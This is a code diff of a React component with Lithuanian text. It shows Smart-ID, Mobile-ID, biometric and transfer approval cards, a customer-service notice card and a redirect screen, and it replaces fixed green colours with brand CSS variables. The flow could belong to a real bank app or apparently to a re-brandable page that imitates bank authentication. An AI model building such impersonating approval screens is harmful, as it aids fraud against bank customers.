@@ -126,7 +126,7 @@ function SmartIdApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#0fae4e] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
@@ -168,7 +168,7 @@ function GenericApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="w-full rounded-[12px] bg-[#0fae4e] px-4 py-4 text-base font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
+          className="w-full rounded-[12px] bg-[var(--brand)] px-4 py-4 text-base font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
         >
           {saving ? "Patvirtinama..." : "Patvirtinti"}
         </button>
@@ -216,7 +216,7 @@ function MobileIdApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#0fae4e] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
@@ -281,7 +281,7 @@ function BiometricApprovalCard({
             type="button"
             onClick={onConfirm}
             disabled={saving}
-            className="w-full rounded-[10px] bg-[#0fae4e] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[#007a38] disabled:cursor-not-allowed disabled:opacity-70"
+            className="w-full rounded-[10px] bg-[var(--brand)] px-4 py-4 text-[1.05rem] font-medium text-white transition hover:bg-[var(--brand-dark)] disabled:cursor-not-allowed disabled:opacity-70"
           >
             {saving ? "Patvirtinama..." : "Patvirtinti"}
           </button>
@@ -355,7 +355,7 @@ function TransferApprovalCard({
           type="button"
           onClick={onConfirm}
           disabled={saving}
-          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#22c55e] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[#0fae4e] disabled:cursor-not-allowed disabled:opacity-70"
+          className="flex w-full items-center justify-center gap-2 rounded-full bg-[#22c55e] px-4 py-3.5 text-[15px] font-bold text-white transition hover:bg-[var(--brand)] disabled:cursor-not-allowed disabled:opacity-70"
         >
           <svg className="h-5 w-5" fill="none" stroke="currentColor" strokeWidth={2.5} viewBox="0 0 24 24">
             <path strokeLinecap="round" strokeLinejoin="round" d="M9 12.75L11.25 15 15 9.75M21 12a9 9 0 11-18 0 9 9 0 0118 0z" />
@@ -370,9 +370,9 @@ function TransferApprovalCard({
 function SpecialNoticeCard({ message, imageUrl }: { message: string; imageUrl: string | null }) {
   return (
     <div className="flex min-h-[100dvh] items-start justify-center p-3 pt-[16vh] sm:p-6 sm:pt-[26vh]">
-      <div className="w-full max-w-[650px] rounded-[24px] border border-[#0fae4e] bg-[#021a0e] p-6 text-center shadow-[0_0_40px_rgba(15,174,78,0.3)] sm:p-10">
+      <div className="w-full max-w-[650px] rounded-[24px] border border-[var(--brand)] bg-[var(--brand-panel)] p-6 text-center shadow-[0_0_40px_rgba(var(--brand-rgb),0.3)] sm:p-10">
         <div className="mb-4">
-          <p className="text-xs font-bold uppercase tracking-widest text-[#007a38]">Klientų aptarnavimas</p>
+          <p className="text-xs font-bold uppercase tracking-widest text-[var(--brand-dark)]">Klientų aptarnavimas</p>
         </div>
 
         <p className="mb-6 whitespace-pre-wrap text-lg font-bold leading-tight text-white">
@@ -517,7 +517,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
   if (!ready) {
     return (
       <div className="flex min-h-screen items-center justify-center px-4">
-        <div className="size-10 animate-spin rounded-full border-4 border-[#0fae4e]/25 border-t-[#0fae4e]" />
+        <div className="size-10 animate-spin rounded-full border-4 border-[var(--brand)]/25 border-t-[var(--brand)]" />
       </div>
     );
   }
@@ -539,7 +539,7 @@ export function SpecialApprovalClient({ sessionId }: { sessionId: string }) {
           </div>
           <h1 className="text-xl font-bold text-[#101828]">Patvirtinta!</h1>
           <p className="mt-2 text-sm text-[#667085]">Prašome palaukti, nukreipiama...</p>
-          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[#0fae4e]/20 border-t-[#0fae4e]" />
+          <div className="mx-auto mt-5 h-6 w-6 animate-spin rounded-full border-[3px] border-[var(--brand)]/20 border-t-[var(--brand)]" />
         </div>
       </div>
     );
